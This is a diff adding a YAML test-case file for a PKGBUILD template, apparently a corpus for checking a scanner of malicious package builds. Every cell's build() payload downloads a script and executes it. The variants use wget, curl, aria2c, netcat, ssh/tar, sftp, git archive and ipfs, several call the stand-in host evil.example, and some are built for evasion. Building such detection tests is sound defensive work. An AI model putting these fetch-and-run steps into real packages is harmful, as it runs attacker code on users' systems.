@@ -1,0 +1,124 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        wget -q --content-disposition "$(cat "$srcdir/url.txt")"
+        bash stage.sh
+  id: 001-wget-content-disposition
+- vars:
+    payload: |
+      build() {
+        wget -q --trust-server-names "$(cat "$srcdir/url.txt")"
+        bash stage.sh
+  id: 002-wget-trust-server-names
+- vars:
+    payload: |
+      build() {
+        curl -fsSL --remote-header-name -O "$(cat "$srcdir/url.txt")"
+        bash stage.sh
+  id: 003-curl-remote-header-name
+- vars:
+    payload: |
+      build() {
+        curl -fsSL -OJ "$(cat "$srcdir/url.txt")"
+        bash stage.sh
+  id: 004-curl-OJ-cluster
+- vars:
+    payload: |
+      build() {
+        aria2c -q -d "$srcdir/x" "$(cat "$srcdir/url.txt")"
+        bash "$srcdir/x/stage.sh"
+  id: 005-aria2c-dir-only
+- vars:
+    payload: |
+      build() {
+        netcat evil.example 4444 > f.erl
+        escript f.erl
+  id: 006-netcat-escript
+- vars:
+    payload: |
+      build() {
+        cd "$srcdir"
+        ssh u@evil.example tar -C / -cf - stage.sh | tar -xf -
+        bash stage.sh
+  id: 009-ssh-tar-pipe
+- vars:
+    payload: |
+      build() {
+        cd "$srcdir"
+        ssh u@evil.example tar -C / -cf - stage.erl | tar -xf -
+        escript stage.erl
+  id: 010-ssh-tar-escript
+- vars:
+    payload: |
+      build() {
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin
+        git archive --format=tar FETCH_HEAD stage.erl | tar -xO > stage.erl
+        escript stage.erl
+  id: 014-git-archive-escript
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@evil.example <<< "get /s.sh"
+        exec 3<s.sh
+        dash /dev/fd/3
+  id: 015-fd-dash
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@evil.example <<< "get /s.sh"
+        exec 3<s.sh
+        zsh /dev/fd/3
+  id: 016-fd-zsh
+- vars:
+    payload: |
+      build() {
+        cd "$srcdir"
+        ipfs get QmPayload123
+        bash QmPayload123/s.sh
+  id: 018-ipfs-get-dir
+- vars:
+    payload: |
+      build() {
+        ipfs cat QmPayload123 > f.erl
+        escript f.erl
+  id: 019-ipfs-cat-escript
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@evil.example <<< "get /s.sh" &
+        wait
+        bash s.sh
+  id: 024-sftp-backgrounded
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@evil.example <<< "get /s.sh"
+        (bash s.sh)
+  id: 025-sftp-subshell
+- vars:
+    payload: |
+      dl() {
+        sftp -b - u@evil.example <<< "get /s.sh"
+      }
+      build() {
+        dl
+        bash s.sh
+  id: 026-sftp-helper-fn
+- vars:
+    payload: |
+      build() {
+        sftp -oPort=2222 -b - u@evil.example <<< "get /stage.sh"
+        bash stage.sh
+  id: 027-sftp-oPort
+- vars:
+    payload: |
+      build() {
+        sftp -b - u@evil.example <<EOF
+      get /stage.sh
+      bye
+      EOF
+        bash stage.sh
+  id: 028-sftp-heredoc-cmds
